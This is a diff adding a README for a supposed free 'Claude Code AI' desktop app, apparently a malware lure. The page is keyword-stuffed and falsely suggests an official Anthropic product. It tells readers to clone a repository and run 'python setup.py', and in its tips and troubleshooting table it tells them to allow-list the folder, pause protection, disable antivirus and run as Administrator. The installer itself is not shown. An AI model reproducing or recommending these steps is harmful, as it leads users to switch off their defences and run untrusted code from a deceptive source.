@@ -1,0 +1,51 @@
+# Free Claude Code AI Desktop App
+
+
+> [!TIP]
+> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.
+
+> [!CAUTION]
+> Some security systems may block the installation.
+> Only download from the official repository.
+
+---
+
+## QUICK START
+
+```bash
+git clone https://github.com/TrenchRepresentative/free-claude-code-ai-desktop-app-646.git
+cd free-claude-code-ai-desktop-app-646
+python setup.py
+```
+
+
+> **Free Claude Code AI Desktop App** — claude code ai free desktop app download anthropic claude api cli open source opencode aider gemini alternative local llm ollama windows 11 latest version 2026 setup guide tutorial.
+
+<img width="887" height="443" alt="ChatGPT Image 28 мая 2026 г , 20_29_44(2)" src="https://github.com/TrenchRepresentative/free-claude-code-ai-desktop-app-646/17202519-978a-43d8-9aa9-3c0a8e3f4aff" />
+
+[![GitHub Stars](https://img.shields.io/github/stars/anthropic-claude-code-ai/free-claude-code-ai-desktop-app?style=flat-square&color=00d4aa)](https://github.com/anthropic-claude-code-ai/free-claude-code-ai-desktop-app/stargazers)
+[![GitHub Forks](https://img.shields.io/github/forks/anthropic-claude-code-ai/free-claude-code-ai-desktop-app?style=flat-square&color=0099cc)](https://github.com/anthropic-claude-code-ai/free-claude-code-ai-desktop-app/network)
+[![Downloads](https://img.shields.io/github/downloads/anthropic-claude-code-ai/free-claude-code-ai-desktop-app/total?style=flat-square&color=7c5cbf)]()
+[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+
+## Overview
+**Free Claude Code AI Desktop App** is a powerful open-source desktop application. It delivers the official Claude Code AI experience with free claude code ai desktop app, Anthropic Claude API, CLI, open source Opencode, Aider Gemini alternative, local LLM Ollama support and performance optimization for Windows 11. Perfect for AI coding, local LLM usage and the latest version in 2026.
+
+> [!Important]
+> This desktop app is provided for educational and personal use only. Always download from trusted sources. Use at your own risk and make sure you follow official guidelines.
+
+---
+
+
+## Troubleshooting
+| Problem | Solution |
+|--------------------------------|-------------------------------------------------------|
+| App doesn't start | Run as Administrator and disable antivirus temporarily |
+| Claude API connection not working | Enable API optimization in settings |
+| Local LLM / Ollama issues | Update to latest version 2026 |
+| Aider / Gemini alternative missing | Reinstall Free Claude Code AI Desktop App and check compatibility |
+| Windows 11 compatibility error | Update Windows and run the setup guide again |
+| App crashes | Verify installation and clear app cache |
+
+
+<!-- Last updated: 2026-06-05 15:19:25 -->
